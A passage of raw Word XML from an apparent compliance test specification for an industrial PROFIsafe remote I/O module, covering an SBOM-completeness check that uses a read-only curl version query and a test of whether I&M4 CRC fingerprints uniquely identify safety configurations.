          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="6BEBB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79E1D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Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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9923A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1. From TC-RQ004-01, list all device-exposed version strings. 2. From documentation, list the known constituent third-party components. 3. Attempt to derive each component's version from any exposed interface. 4. For derivable versions, query a vulnerability database (off-lab); record the rest as un-inventoried.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="09663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E2537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684ED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Expected = FAIL: third-party components are not individually exposed and no SBOM exists → confirms G-2; documented as a CR 7.8 completeness shortfall requiring an SBOM (BSI TR-03183 / ISVS V1.1.1).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31998172" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9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E404B9" w:rsidRPr="00E404B9" w14:paraId="1351BE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07B8A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43FD1A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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="75F29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783C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lastRenderedPageBreak/>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B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76CB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TC-RQ004-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="4C87B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DEDE2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BFBCD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 xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt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eth1 = 192.168.50.10; CVE lookup performed off-lab (no </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>lab↔Internet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coupling)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="691861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4006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1362F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curl (inventory); manual coverage table; NVD lookup off-lab; optional GVM/OpenVAS (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm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CM-008) on the HTTP surface only</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6769B5F8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# TC-RQ004-02 SBOM-completeness assessment (device side = read-only enumeration)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D76DB09" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId101" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/fieldbussetup/fieldbusfirmware</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0402_stack.json # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BDD059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# Coverage table: exposed-version vs known constituent (NOT exposed by device):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EEA546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# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>uC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/OS-II (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Micrium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) [SRIO-1260] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45473816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# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack (SIL3) [SRIO-1929] -&gt; partially via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbusfirmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="583F6CAC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# STM32F7 Self-Test Library [SRIO-10766] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1438E3AB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# netX90 PROFINET stack [SRIO-1768] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6582E126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# derivable versions -&gt; off-lab NVD query; rest -&gt; "un-inventoried"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69045A53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| Expected | Only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack version partially derivable; RTOS/STL/netX90 versions not exposed → no SBOM, no third-party CVE correlation. | | Result | ☐ SBOM absent (G-2 confirmed) — un-inventoried: ______ | | Evidence | TC0402_stack.json, exposed-vs-constituent coverage table, off-lab NVD notes | </w:t>
      </w:r>
      <w:hyperlink r:id="rId102" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId103" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId104" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[ICS-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Securi</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>endium_pdf</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="670A1517" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="0E623F13">
          <v:rect id="_x0000_i1050" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D805A0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TC-RQ004-04 — Data-Identification Fingerprint Uniqueness (G-1 correction, identification-scoped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625C7EAD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7757"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="191E54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748B7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180FAE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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="66CF4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877CB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8847B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TC-RQ004-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="726D62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7C2F6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F391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RQ-004 → CR 7.8 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data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limb</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>) → Asset B</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0785E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2BF01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67F1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Incomplete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identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="79EE2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3B40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SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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E570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SVV-1 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Requirements-based</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="15206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13557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831EE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Confirm that the safety data is identified: the I&amp;M4 signature (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_iParCRC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+ </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Par_CRC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) uniquely </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>characterises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the loaded safety configuration, so that different configurations yield different fingerprints — establishing that data </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>is</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> identified (as a fingerprint), correcting the "data not addressed" premise. </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>This is an identification test (does the fingerprint identify the config?), not a modification-evidence test.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="4C6B5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1C8B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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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D6653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1. Load configuration A; read I&amp;M4. 2. Load a materially different configuration B; read I&amp;M4. 3. Confirm the two fingerprints differ and each uniquely maps to its configuration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="580FEE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C75B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lastRenderedPageBreak/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FC532E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 xml:space="preserve">PASS </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff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distinct configurations produce distinct I&amp;M4 fingerprints (data identified via fingerprint). Documented limitation: the fingerprint identifies </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>that</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a specific config is loaded but does not enumerate/classify </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>which</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> data elements are EHSR-critical (G-1 residual).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="764D73BA" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9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E404B9" w:rsidRPr="00E404B9" w14:paraId="57595A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D95EB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4D08D9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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0A7DA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883A1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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9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E76BA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TC-RQ004-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="513D8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6D4B8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B5A22" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">SPS 192.168.0.1, DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>path</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="5F26F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7B830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E404B9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1F0FE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TIA Portal (load configs A/B); PN acyclic read for I&amp;M4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="35CA6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A1C9C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Procedure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87917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 xml:space="preserve">Read I&amp;M4 (config A) → load config B → read I&amp;M4; compare </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Par_CRC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values</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="6C221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23590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Expected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D9034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r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">I&amp;M4(A) ≠ I&amp;M4(B); each fingerprint uniquely </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>characterises</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> its config (SRIO-3011). </w:t>
            </w:r>
            <w:hyperlink r:id="rId105" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="079D8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308A6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FBB9F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☐ Fingerprint unique per config (data identified) ☐ Content-level classification absent (G-1 residual)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="6C5EE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2AF9F" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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83D28" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>I&amp;M4 reads for A and B, config-vs-fingerprint mapping table</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="107FF0D2" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="6A1A766B">
          <v:rect id="_x0000_i1051" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1746655C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Summary of Changes (vs. my original RQ-004)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AB2F53" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr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Removed REVISION_COUNTER as a "data identification" mechanism — it is a modification counter = RQ-009 (modification evidence), not identification. This is the direct analogue of the RQ-002 correction. </w:t>
      </w:r>
      <w:hyperlink r:id="rId106" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
